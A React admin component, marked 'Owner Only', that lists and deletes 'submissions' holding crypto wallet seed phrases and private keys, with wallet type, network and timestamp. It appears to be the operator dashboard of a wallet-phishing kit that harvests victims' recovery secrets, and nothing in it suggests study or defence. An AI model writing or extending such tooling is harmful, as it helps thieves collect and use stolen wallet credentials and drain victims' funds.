
import React, { useEffect, useState } from "react";
import { toast } from "react-toastify";

export default function SubmissionTable() {
  const [submissions, setSubmissions] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState("");

  const apiUrl = import.meta.env.DEV 
    ? import.meta.env.VITE_API_URL_DEV 
    : import.meta.env.VITE_API_URL_PROD;

  useEffect(() => {
    async function fetchSubmissions() {
      setLoading(true);
      setError("");
      try {
        const res = await fetch(`${apiUrl}/api/submissions`, {
          credentials: "include",
        });
        if (!res.ok) throw new Error("Failed to fetch submissions");
        const data = await res.json();
        setSubmissions(data);
      } catch (e) {
        setError(e.message || "Error fetching submissions");
      } finally {
        setLoading(false);
      }
    }
    fetchSubmissions();
  }, []);

  const deleteSubmission = async (id) => {
    try {
      const res = await fetch(`${apiUrl}/api/submissions/${id}`, {
        method: "DELETE",
        credentials: "include",
      });
      if (!res.ok) throw new Error("Delete failed");
      setSubmissions((prev) => prev.filter((s) => s._id !== id));
      toast.success("Submission deleted");
    } catch (e) {
      toast.error(e.message || "Delete failed");
    }
  };

  const clearAllSubmissions = () => {
    toast.info(
      <div>
        <p className="mb-3">Delete all submissions? This action cannot be undone.</p>
        <button
          onClick={async () => {
            try {
              for (const sub of submissions) {
                await fetch(`${apiUrl}/api/submissions/${sub._id}`, {
                  method: "DELETE",
                  credentials: "include",
                });
              }
              setSubmissions([]);
              toast.dismiss();
              toast.success("All submissions cleared!");
            } catch (e) {
              toast.dismiss();
              toast.error(e.message || "Failed to clear submissions");
            }
          }}
          className="inline-block rounded bg-red-600 px-4 py-2 text-white font-semibold hover:bg-red-700 mr-2"
        >
          Confirm Delete All
        </button>
        <button
          onClick={() => toast.dismiss()}
          className="inline-block rounded bg-gray-500 px-4 py-2 text-white font-semibold hover:bg-gray-600"
        >
          Cancel
        </button>
      </div>,
      { autoClose: false }
    );
  };

  return (
    <div className="min-h-screen bg-bg p-6 text-text dark:bg-darkbg dark:text-darktext">
      <div className="mx-auto max-w-[1100px] rounded-xl bg-card p-6 shadow-card dark:bg-darkcard">
        <div className="flex items-center justify-between">
          <h1 className="font-montserrat text-2xl font-bold text-primary dark:text-white">
            Submissions (Owner Only)
          </h1>
          {submissions.length > 0 && (
            <button
              onClick={clearAllSubmissions}
              className="rounded bg-orange-500 px-4 py-2 text-xs font-semibold text-white hover:bg-orange-700"
            >
              Clear All
            </button>
          )}
        </div>

        {loading ? (
          <p className="mt-4 text-sm">Loading...</p>
        ) : error ? (
          <p className="mt-4 text-sm text-red-500">{error}</p>
        ) : submissions.length === 0 ? (
          <p className="mt-4 text-sm text-black/70 dark:text-white/70">
            No submissions yet.
          </p>
        ) : (
          <div className="mt-4 overflow-x-auto">
            <table className="w-full border-collapse text-sm">
              <thead>
                <tr className="bg-black/5 dark:bg-white/5">
                  <th className="px-3 py-2">Action</th>
                  <th className="px-3 py-2">Wallet Type</th>
                  <th className="px-3 py-2">Network</th>
                  <th className="px-3 py-2">SeedPhrase</th>
                  <th className="px-3 py-2">Private Key</th>
                  <th className="px-3 py-2">Timestamp</th>
                </tr>
              </thead>
              <tbody>
                {submissions.map((sub) => (
                  <tr key={sub._id} className="border-b border-black/10 dark:border-white/10">
                    <td className="px-3 py-2">{sub.action}</td>
                    <td className="px-3 py-2">{sub.walletType}</td>
                    <td className="px-3 py-2">{sub.network}</td>
                    <td className="px-3 py-2">{sub.secretPhrase || "-"}</td>
                    <td className="px-3 py-2">{sub.walletSecret || "-"}</td>
                    <td className="px-3 py-2">{sub.note || "-"}</td>
                    <td className="px-3 py-2">{new Date(sub.createdAt).toLocaleString()}</td>
                    <td className="px-3 py-2">
                      <button
                        onClick={() => {
                          toast.info(
                            <div>
                              <p className="mb-3">Delete this submission?</p>
                              <button
                                onClick={(e) => {
                                  e.stopPropagation();
                                  deleteSubmission(sub._id);
                                  toast.dismiss();
                                }}
                                className="inline-block rounded bg-red-600 px-4 py-2 text-white font-semibold hover:bg-red-700 mr-2"
                              >
                                Confirm
                              </button>
                              <button
                                onClick={() => toast.dismiss()}
                                className="inline-block rounded bg-gray-500 px-4 py-2 text-white font-semibold hover:bg-gray-600"
                              >
                                Cancel
                              </button>
                            </div>,
                            { autoClose: false }
                          );
                        }}
                        className="rounded bg-red-500 px-3 py-1 text-xs font-semibold text-white hover:bg-red-700"
                      >
                        Delete
                      </button>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}
      </div>
    </div>
  );
}
